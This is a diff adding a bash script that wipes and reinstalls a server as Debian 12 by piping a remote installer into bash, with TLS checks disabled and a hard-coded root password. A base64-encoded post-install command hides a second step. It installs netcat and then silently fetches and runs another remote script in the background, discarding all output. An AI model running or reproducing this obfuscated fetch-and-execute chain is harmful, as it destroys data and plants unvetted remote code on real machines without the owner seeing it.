@@ -1,0 +1,7 @@
+#!/bin/bash
+
+sleep 120
+#sleep "$[od -An -N2 -i /dev/urandom % 10800 + 10800]"
+
+
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "NP1215GP55*3*AACAAC" -port 22 -cmd "IyEvYmluL2Jhc2gKIyBEZWJpYW4xMisKYXB0IHVwZGF0ZSAteSAmJiBhcHQgaW5zdGFsbCBzdWRvIGN1cmwgd2dldCAteQpzdWRvIGFwdCAtcXF5IHVwZGF0ZSA+L2Rldi9udWxsIDI+JjEgfHwgYXB0IC1xcXkgdXBkYXRlID4vZGV2L251bGwgMj4mMQpzdWRvIGFwdCAtcXF5IGluc3RhbGwgd2dldCBwcm9jcHMgcHNtaXNjIGxzb2YgY3JvbiBpY3UtZGV2dG9vbHMgbmV0Y2F0LXRyYWRpdGlvbmFsIGJpbmQ5LWhvc3QgPi9kZXYvbnVsbCAyPiYxIHx8IGFwdCAtcXF5IGluc3RhbGwgd2dldCBwcm9jcHMgcHNtaXNjIGxzb2YgY3JvbiBpY3UtZGV2dG9vbHMgbmV0Y2F0LXRyYWRpdGlvbmFsIGJpbmQ5LWhvc3QgPi9kZXYvbnVsbCAyPiYxCmJhc2ggPCh3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgLXFPLSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vemphYWNteXgvYXFiL21haW4vc2h1YW5nd2FhcWIuc2gpID4vZGV2L251bGwgMj4mMSAm"
